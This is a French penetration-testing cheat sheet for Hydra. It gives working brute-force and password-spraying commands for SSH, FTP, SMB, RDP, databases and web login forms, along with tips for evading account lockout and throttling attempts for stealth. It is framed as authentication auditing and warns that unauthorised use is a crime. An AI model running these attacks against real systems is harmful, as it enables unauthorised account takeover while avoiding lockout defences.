# Cheat Sheet : Hydra — Bruteforce & Password Spraying

!!! tip "Usage principal"
    Tester la robustesse des authentifications réseau et web par brute-force ou password spraying — SSH, FTP, SMB, RDP, HTTP et formulaires HTML POST.

---

## 1. Syntaxe de base

```bash
# Structure générale
hydra [options] [cible] [module] [paramètres_module]

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

---

## 2. Flags Essentiels

### Utilisateur & Mot de passe
```bash
hydra -l admin -p password123          # login unique + mot de passe unique
hydra -l admin -P passwords.txt        # login unique + wordlist de mots de passe
hydra -L users.txt -p Password1        # liste de logins + mot de passe unique (password spraying)
hydra -L users.txt -P passwords.txt    # liste de logins + liste de mots de passe (bruteforce combinatoire)
hydra -C credentials.txt              # fichier de paires login:password prêtes (format user:pass)
```

### Threads, délai & reprise de session
```bash
hydra -t 16                            # 16 threads parallèles (défaut : 16, réduire pour discrétion)
hydra -t 4 -w 3                        # 4 threads + délai de 3 secondes entre les tentatives
hydra -R                               # reprend une session interrompue (fichier hydra.restore)
```

### Verbosité & Sauvegarde
```bash
hydra -v                               # verbeux : affiche chaque tentative en cours
hydra -vV                              # très verbeux : affiche login:pass testé à chaque essai
hydra -o resultats.txt                 # sauvegarde les credentials trouvés dans un fichier
```

## Synthèse — Tableau des flags essentiels

| Flag | Rôle |
| --- | --- |
| `-l LOGIN` | Login unique |
| `-L FILE` | Wordlist de logins |
| `-p PASS` | Mot de passe unique |
| `-P FILE` | Wordlist de mots de passe |
| `-C FILE` | Fichier de paires `user:pass` |
| `-t N` | Nombre de threads (défaut : 16) |
| `-w N` | Délai en secondes entre les tentatives |
| `-s PORT` | Port cible non standard |
| `-vV` | Mode très verbeux (login:pass affiché à chaque essai) |
| `-o FILE` | Sauvegarde les succès dans un fichier |
| `-R` | Reprend la session depuis `hydra.restore` |
| `-f` | Arrête dès le premier credential valide trouvé |
| `-e nsr` | Teste aussi : `n`=vide, `s`=login=pass, `r`=pass=login inversé |

---

## 3. Bruteforce par Protocole

### Services réseau courants
```bash
# SSH : bruteforce d'authentification SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

```bash
# FTP : accès FTP (tenter aussi -l anonymous -p anonymous pour l'accès anonyme)
hydra -L users.txt -P passwords.txt ftp://192.168.1.10
```

```bash
# SMB : authentification Windows/Samba
hydra -l administrator -P passwords.txt smb://192.168.1.10
```

```bash
# RDP : bureau à distance Windows (port 3389 par défaut)
hydra -l administrator -P passwords.txt rdp://192.168.1.10
```

```bash
# MySQL : authentification base de données
hydra -l root -P passwords.txt mysql://192.168.1.10
```

```bash
# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.10
```

```bash
# Port non standard : -s pour spécifier un port différent du défaut
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.10
```

### Synthèse — Modules protocoles courants

| Protocole | Module | Port défaut |
| --- | --- | --- |
| SSH | `ssh` | 22 |
| FTP | `ftp` | 21 |
| SMB | `smb` | 445 |
| RDP | `rdp` | 3389 |
| MySQL | `mysql` | 3306 |
| PostgreSQL | `postgres` | 5432 |
| HTTP Basic Auth | `http-get` | 80 |
| HTTPS Basic Auth | `https-get` | 443 |
| Formulaire POST | `http-post-form` | 80 |
| SMTP | `smtp` | 25 |
| POP3 | `pop3` | 110 |
| IMAP | `imap` | 143 |
| Telnet | `telnet` | 23 |

### HTTP Basic Auth
```bash
# Bruteforce d'une zone protégée par Basic Auth (en-tête WWW-Authenticate)
hydra -l admin -P passwords.txt http-get://192.168.1.10/admin/
```

```bash
# Équivalent HTTPS avec -k pour ignorer le certificat SSL auto-signé
hydra -l admin -P passwords.txt -k https-get://192.168.1.10/admin/
```

---

## 4. Formulaires HTTP POST (`http-post-form`)

### Syntaxe détaillée
```bash
# Structure du paramètre http-post-form :
# "/chemin/login:champ_user=^USER^&champ_pass=^PASS^:F=message_echec"

hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Incorrect username or password"
```

```bash
# Avec cookie de session (si une étape de récupération de token CSRF est nécessaire avant)
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"
```

```bash
# Marqueur de SUCCÈS (S=) au lieu d'échec : utiliser quand la page d'échec est vide ou générique
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:S=Dashboard"
```

### Anatomie du paramètre `http-post-form`

| Segment | Rôle | Exemple |
| --- | --- | --- |
| Chemin | URL de l'action du formulaire | `/login.php` |
| Corps POST | Paramètres avec marqueurs `^USER^` et `^PASS^` | `user=^USER^&pass=^PASS^` |
| `F=texte` | Chaîne présente dans la réponse en cas d'**échec** | `F=Incorrect` |
| `S=texte` | Chaîne présente dans la réponse en cas de **succès** | `S=Welcome` |
| `H=header` | Header HTTP supplémentaire | `H=Cookie: session=xyz` |

!!! tip "Identifier le bon marqueur F= ou S="
    Ouvrir Burp Suite (ou DevTools → Network), soumettre une tentative échouée et noter un texte **unique et stable** présent uniquement dans la réponse d'échec (ex: "Invalid credentials") → `F=`. Si la page d'erreur varie, chercher un texte présent uniquement après un succès (ex: "Logout") → `S=`. Un mauvais marqueur = tous les credentials signalés comme valides.

---

## 5. Password Spraying vs Bruteforce

```bash
# PASSWORD SPRAYING : 1 mot de passe testé sur TOUS les comptes → évite le verrouillage
hydra -L users.txt -p "Entreprise2024!" smb://192.168.1.10 -t 1 -w 30
```

```bash
# BRUTEFORCE : toutes les combinaisons sur 1 compte → risque de verrouillage élevé
hydra -l admin -P rockyou.txt ssh://192.168.1.10
```

!!! warning "Account Lockout — Risques & Bonnes Pratiques en Audit"
    Le bruteforce intensif (`-t 16`, wordlist massive) peut **verrouiller les comptes cibles** en quelques secondes sur les politiques Active Directory standard (3 à 5 tentatives = verrouillage). En audit d'authentification :

    - **Password Spraying** (`-L users.txt -p MotDePasse`) : 1 seul mot de passe par compte par cycle — reste sous le seuil de verrouillage si le délai entre cycles est supérieur à la fenêtre d'observation (souvent 30 minutes).
    - **Réduire les threads** : `-t 1` et `-w 30` pour un essai toutes les 30 secondes.
    - **Obtenir le seuil avant de commencer** : interroger la politique de mots de passe (`net accounts /domain` sur Windows, `chage -l` sur Linux) pour connaître les limites exactes.
    - En dehors d'un cadre d'audit contractuel, tenter un bruteforce est une **violation des systèmes** punissable pénalement.
